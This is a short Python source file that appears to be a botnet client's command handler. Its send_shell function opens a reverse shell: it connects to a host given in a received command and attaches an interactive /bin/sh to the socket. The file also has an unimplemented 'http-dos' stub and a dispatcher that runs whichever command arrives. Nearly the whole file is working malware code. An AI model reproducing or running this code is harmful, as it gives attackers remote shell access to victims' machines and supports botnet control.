import os
import socket
import subprocess

def send_shell(target):
    ip = target[:target.index(':')]
    port = target[target.index(':')+1:]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),3)
    p=subprocess.call(["/bin/sh","-i"])

def http_dos(target):
    print "HERE!"

def bot_action(parsed_command):
    if parsed_command['command'] == 'send-shell':
        send_shell(parsed_command['target'])
    elif parsed_command['command'] == 'http-dos':
        http_dos(parsed_command['target'])
